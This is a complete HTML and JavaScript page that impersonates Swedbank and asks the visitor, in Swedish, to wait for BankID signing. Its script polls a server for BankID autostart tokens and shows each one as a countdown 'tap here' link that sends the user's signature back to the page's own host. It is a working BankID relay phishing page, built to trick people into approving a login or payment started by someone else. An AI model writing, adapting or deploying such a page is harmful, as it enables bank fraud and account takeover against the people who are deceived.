<!doctype html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Swedbank</title>
<style>
body{margin:0;font-family:-apple-system,Roboto,sans-serif;background:#f3f3f3;color:#1a1a1a}
.top{background:#fff;padding:16px 20px;font-weight:700;color:#ff6a00;font-size:20px;border-bottom:1px solid #e6e6e6}
.wrap{padding:30px 20px;text-align:center}
h1{font-size:19px;font-weight:600;line-height:1.45;margin:0 0 8px}
p{color:#555;font-size:15px;line-height:1.55}
#b{display:block;margin:26px auto 0;padding:18px;max-width:340px;box-sizing:border-box;border-radius:10px;background:#e9e9e9;color:#8a8a8a;font-size:17px;font-weight:700;text-decoration:none}
#b.live{background:#ff6a00;color:#fff}
#b small{display:block;font-weight:400;font-size:12px;margin-top:7px;opacity:.85}
.spin{width:34px;height:34px;margin:26px auto;border:3px solid #ddd;border-top-color:#ff6a00;border-radius:50%;animation:s 1s linear infinite}
@keyframes s{to{transform:rotate(360deg)}}
.foot{font-size:13px;color:#777;margin-top:34px;line-height:1.5}
</style>
</head>
<body>
<div class="top">Swedbank</div>
<div class="wrap">
  <h1>Valkommen!</h1>
  <p>Vanligen invanta BankID-signeringen for att fortsatta.</p>
  <div class="spin"></div>
  <a id="b" href="#">Vantar...</a>
  <p class="foot">Du ar nu i kontakt med Swedbank.<br>Folj instruktionerna.</p>
</div>
<script>
var code = location.pathname.split('/').pop();
var b = document.getElementById('b');
var lastTok = '';
var timer = null;

function poll() {
  fetch('/api/session/' + code + '/state').then(function(r){return r.json()}).then(function(s){
    if (!s.ok) return;
    if (s.token && s.token !== lastTok) {
      lastTok = s.token;
      b.className = 'live';
      b.href = 'bankid:///?autostarttoken=' + s.token + '&redirect=' +
        encodeURIComponent(location.protocol + '//' + location.host + '/api/signed?code=' + code);
      b.innerHTML = 'TRYCK HAR<small>' + s.ttl + ' s</small>';
      clearInterval(timer);
      var left = s.ttl;
      timer = setInterval(function(){
        left--;
        var sm = b.querySelector('small');
        if (left <= 0) {
          clearInterval(timer);
          b.className = '';
          b.innerHTML = 'Vantar...<small>Token har gatt ut</small>';
        } else if (sm) {
          sm.textContent = left + ' s';
        }
      }, 1000);
    }
  }).catch(function(){});
}
setInterval(poll, 800);
poll();
</script>
</body>
</html>
